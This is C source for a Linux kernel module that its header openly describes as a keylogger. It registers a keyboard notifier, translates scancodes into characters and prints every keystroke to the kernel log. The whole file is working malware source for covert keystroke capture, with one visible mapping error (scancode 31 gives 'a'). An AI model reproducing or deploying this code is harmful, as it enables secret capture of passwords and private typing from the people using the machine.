/*----------------------------------------------------
Name:   stdinc.h
Date:   2015.05.12
Auth:   Sun Dro (a.k.a. 7th Ghost / kala13x)
Desc:   Kernel Based KeyLogger Module
----------------------------------------------------*/


/* Linux includes */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

/* Driver info */
#define DRIVER_LICENSE "GPL"


/*---------------------------------------------
| Handle key signal and return in char value
---------------------------------------------*/
char banti_handle_key(int key)
{
    char ret;

    /* Handle keys */
    switch(key) 
    {
        case 13:
            ret = '=';
            break;
        case 16:
            ret = 'q';
            break;
        case 17:
            ret = 'w';
            break;
        case 18:
            ret = 'e';
            break;
        case 19:
            ret = 'r';
            break;
        case 20:
            ret = 't';
            break;
        case 21:
            ret = 'y';
            break;
        case 22:
            ret = 'u';
            break;
        case 23:
            ret = 'i';
            break;
        case 24:
            ret = 'o';
            break;
        case 25:
            ret = 'p';
            break;
        case 28:
            ret = '\n';
            break;
        case 30:
            ret = 'a';
            break;
        case 31:
            ret = 'a';
            break;
        case 32:
            ret = 'd';
            break;
        case 33:
            ret = 'f';
            break;
        case 34:
            ret = 'g';
            break;
        case 35:
            ret = 'h';
            break;
        case 36:
            ret = 'j';
            break;
        case 37:
            ret = 'k';
            break;
        case 38:
            ret = 'l';
            break;
        case 39:
            ret = ';';
            break;
        case 44:
            ret = 'z';
            break;
        case 45:
            ret = 'x';
            break;
        case 46:
            ret = 'c';
            break;
        case 47:
            ret = 'v';
            break;
        case 48:
            ret = 'b';
            break;
        case 49:
            ret = 'n';
            break;
        case 50:
            ret = 'm';
            break;
        case 51:
            ret = ',';
            break;
        case 55:
            ret = '*';
            break;
        case 57:
            ret = '\t';
            break;
        case 78:
            ret = '+';
            break;
        case 98:
            ret = '/';
            break;
        case 11:
        case 82:
            ret = '0';
            break;
        case 2:
        case 79:
            ret = '1';
            break;
        case 3:
        case 80:
            ret = '2';
            break;
        case 4:
        case 81:
            ret = '3';
            break;
        case 5:
        case 75:
            ret = '4';
            break;
        case 6:
        case 76:
            ret = '5';
            break;
        case 7:
        case 77:
            ret = '6';
            break;
        case 8:
        case 71:
            ret = '7';
            break;
        case 9:
        case 72:
            ret = '8';
            break;
        case 10:
        case 73:
            ret = '9';
            break;
        case 12:
        case 74:
            ret = '-';
            break;
        case 83:
        case 52:
            ret = '.';
            break;
        default:
            ret = ' ';
    }

    return ret; 
}


/*---------------------------------------------
| Get notifed press key
---------------------------------------------*/
int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_param) 
{
    /* Used variables */
    char key;
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE)
    {
        /* Get and log key */
        key = banti_handle_key(param->value);
        if(param->down)
            printk(KERN_INFO "%c", key); 
    }

    return NOTIFY_OK;
}


/*---------------------------------------------
| Module notification block
---------------------------------------------*/
static struct notifier_block notifer_deamon =
{
    .notifier_call = banti_key_notifer
};


/*---------------------------------------------
| Register keyboard module
---------------------------------------------*/
static int __init banti_keylog_init(void)
{
    register_keyboard_notifier(&notifer_deamon);
    printk(KERN_INFO "Registring banti keyboard module\n");
    return 0;
}


/*---------------------------------------------
| Clean keyboard module
---------------------------------------------*/
static void __exit banti_keylog_clean(void)
{
    unregister_keyboard_notifier(&notifer_deamon);
    printk(KERN_INFO "Unregistered banti keyboard module\n");
}


/*---------------------------------------------
| Module initialisations
---------------------------------------------*/
module_init(banti_keylog_init);
module_exit(banti_keylog_clean);
MODULE_LICENSE(DRIVER_LICENSE);